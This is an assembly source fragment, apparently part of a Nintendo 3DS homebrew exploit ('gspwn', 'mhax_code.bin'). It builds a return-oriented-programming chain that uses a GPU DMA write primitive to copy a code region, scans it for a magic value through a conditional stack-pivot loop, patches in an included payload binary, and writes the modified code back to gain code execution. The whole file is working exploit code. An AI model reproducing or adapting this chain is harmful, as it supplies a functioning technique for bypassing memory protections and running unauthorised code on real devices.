rop:
	; copy codebin data to linear heap so CPU can search through it
	gspwn MCOPY_RANDCODEBIN_COPY_BASE, MCOPY_RANDCODEBIN_BASE, MCOPY_CODEBIN_SIZE
	sleep 200*1000*1000, 0x00000000

	; initialize loop variables
	str_val MCOPY_SCANLOOP_CURPTR, MCOPY_RANDCODEBIN_COPY_BASE - MCOPY_SCANLOOP_STRIDE

	; for(u32* ptr = MCOPY_RANDCODEBIN_COPY_BASE; *ptr != magic_value; ptr += MCOPY_SCANLOOP_STRIDE/4);
	scan_loop:
		; increment ptr
		ldr_add_r0 MCOPY_SCANLOOP_CURPTR, MCOPY_SCANLOOP_STRIDE
		str_r0 MCOPY_SCANLOOP_CURPTR

		; compare *ptr to magic_value
		cmp_derefptr_r0addr MCOPY_SCANLOOP_MAGICVAL, scan_loop, scan_loop_pivot_after

		; use comparison result to determine pivot target
		str_r0 scan_loop_pivot + 4
	
		; this pivot's destination is populated by the conditional gadget above
		scan_loop_pivot:
		jump_sp 0xDEADBABE
		scan_loop_pivot_after:

	memcpy MCOPY_RANDCODEBIN_COPY_BASE, initial_code, initial_code_end - initial_code

	flush_dcache MCOPY_RANDCODEBIN_COPY_BASE, 0x00100000

	gspwn_dstderefadd (MCOPY_RANDCODEBIN_BASE) - (MCOPY_RANDCODEBIN_COPY_BASE), MCOPY_SCANLOOP_CURPTR, MCOPY_RANDCODEBIN_COPY_BASE, 0x800, 0

	sleep 200*1000*1000, 0x00000000

	.word MCOPY_SCANLOOP_TARGETCODE

.align 0x4
	initial_code:
		.incbin "../build/mhax_code.bin"
	initial_code_end:
